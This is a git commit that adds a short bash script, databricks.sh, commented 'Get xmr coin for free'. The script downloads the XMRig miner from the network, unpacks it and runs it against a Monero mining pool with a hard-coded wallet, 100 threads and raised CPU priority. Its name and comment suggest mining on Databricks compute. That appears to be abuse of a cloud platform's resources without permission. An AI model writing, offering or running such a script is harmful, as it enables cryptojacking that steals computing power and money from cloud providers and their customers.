e063bd12fea0938ed18564be44ccd5afea240bec
bodinhoblink <39828630+bodinhoblink@users.noreply.github.com>
2022-05-06 22:38:28 -0300

    Create databricks.sh

---
+++ databricks.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -a rx/0 -o ca.monero.herominers.com:10191 -u 8BrixK3vTTdPRG92JMdwsefnDpLvzJUST6xf5PQn3iW2PFne3zwVAGhQPoVDx8zY2zG3WE9GvY1djgDB8HXhsg3wHxTCe9e -k --tls -p Threadripper --threads=100 --cpu-priority=5
